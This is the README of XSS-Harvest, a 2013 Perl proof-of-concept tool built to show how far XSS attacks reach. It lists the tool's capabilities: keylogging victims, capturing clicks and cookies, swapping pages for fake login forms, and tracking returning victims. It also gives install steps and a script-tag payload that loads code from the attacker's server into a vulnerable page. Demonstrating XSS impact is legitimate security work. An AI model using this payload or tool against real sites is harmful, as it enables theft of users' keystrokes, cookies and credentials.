XSS-Harvest
===========

* Author: geoff.jones@cyberis.co.uk
* Copyright: Cyberis Limited 2013
* License: GPLv3 (See LICENSE)
* Version: 0.4

XSS-Harvest - a proof of concept harvesting tool for demonstrating the real power of XSS attacks

About
-----
XSS-Harvest is multi-threaded pre-forking web server written in Perl, and requires no dependencies other than a couple of common Perl modules; you do not need a web server or database to use this tool. Before going into the detail, I'll list the high level functionality below:

* Infection script adds relevant event listeners (keystrokes, onload() and mouse clicks) to the vulnerable page and sets up communication with the XSS-Harvest server.
* Any key entered will be sent covertly to the server.
* Any mouse click performed will be analysed and the data covertly sent to the server.
* Optionally 'redress' the vulnerable page to display a different page on the same subdomain - e.g. a login form.
* If redressing the victim's browser, allow subsequently loaded pages to be also 'infected' - assuming they don't break the same-origin policy (i.e. they're on the same subdomain).
* Keeps track of victims for the lifetime of the XSS-Harvest cookie (future visits are recognised as a returning victim).
* Each victim has a separate history file containing all events, cookies and keystrokes. 
* Server console displays real time data received (due to multi-threaded nature, keystrokes are displayed as '.' characters to avoid confusion).
* Tested in IE6-9 (reflected XSS protection in IE9 will limit exploitation to stored XSS only in most cases), FF5, Chrome and various mobile browsers (Safari and Android). Please let me know your success with other browsers.
* Overcomes browser oddities, such as Internet Explorer throttling requests to the same URL when exfiltrating keystrokes.

Dependencies
------------
Requires the following dependencies:
```perl
use HTTP::Server::Simple::CGI;
use Digest::MD5;
use Time::Local;
use Getopt::Std;
use Net::Server::PreFork;
```

Ubuntu/Debian install
---------------------

    sudo apt-get install libhttp-server-simple-perl libdigest-md5-file-perl libtime-local-perl libnet-server-perl

OSX Install
-----------

    sudo cpan install HTTP::Server::Simple::CGI
    sudo cpan install Digest::MD5
    sudo cpan install Digest::Time::Local
    sudo cpan install Getopt:Std
    sudo cpan install Net::Server::Prefork

Usage
-----
Start server (with redress:)

```bash
./xss-harvest.pl -l -r http://vulnerablepage.local/login.html
```

XSS:
```html
<script src="http://<serverip>:<serverport>/i"></script>
```
Issues
------
Kindly report all issues via https://github.com/cyberisltd/XSS-Harvest/issues
